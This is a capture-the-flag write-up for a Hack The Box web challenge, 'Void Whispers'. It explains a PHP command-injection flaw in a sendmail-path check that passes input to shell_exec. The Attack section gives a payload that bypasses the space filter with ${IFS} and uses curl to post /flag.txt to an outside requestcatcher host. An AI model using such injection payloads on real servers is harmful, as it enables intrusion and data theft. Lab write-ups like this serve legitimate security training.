# Web - Void Whispers

## Description

In the dead of night, an eerie silence envelops the town, broken only by the faintest of echoes—whispers in the void. A phantom mailer is sending out silent commands, unseen and unheard, manipulating systems from the shadows. The townsfolk remain oblivious to the invisible puppeteer pulling their strings. Legends hint that sending the right silent message back could reveal hidden secrets. Can you tap into the darkness, craft the perfect unseen command, and shut down the malevolent force before it plunges the world into chaos?

## Homepage

<figure><img src="../../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

## Source code review

<figure><img src="../../../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

This is the function that our user input reaches,&#x20;

After a fraction of second, we can find the vulnerability, backend has `shell_exec`to execute `which` command.

```php
if (preg_match('/\s/', $sendMailPath)) {
  return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400);
}

$whichOutput = shell_exec("which $sendMailPath");
if (empty($whichOutput)) {
  return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
}
```

So it checks if our user input has any ' ' (space) included, if yes, it returns 'Sendmail path should not contain spaces!'

There's a trick to bypass spaces in linux (which works in bash only)

{% embed url="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces" %}

We can use `${IFS}` instead of a   space.

## Attack

<figure><img src="../../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

### Payload

```bash
/usr/bin/curl;curl${IFS}-X${IFS}POST${IFS}heapbytes.requestcatcher.com/test${IFS}-d${IFS}"$(cat${IFS}/flag.txt)"

# --- breakdown
# curl${IFS}-X${IFS}POST${IFS}heapbytes.requestcatcher.com/test
##-> this will send post data to our requestcatcher
## Decodes to : curl heapbytes.requestcatcher.com/test

# ---
# ${IFS}-d${IFS}"$(cat${IFS}/flag.txt)"
## -> this will send post body data, it will send flag.txt 
## Decodes to : -d "$(cat /flag.txt)"
```

<figure><img src="../../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

```bash
HTB{c0mm4nd_1nj3ct10n_4r3_3457_70_f1nD!!_098912b889858de2519e1b18abe0eced}
```

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning
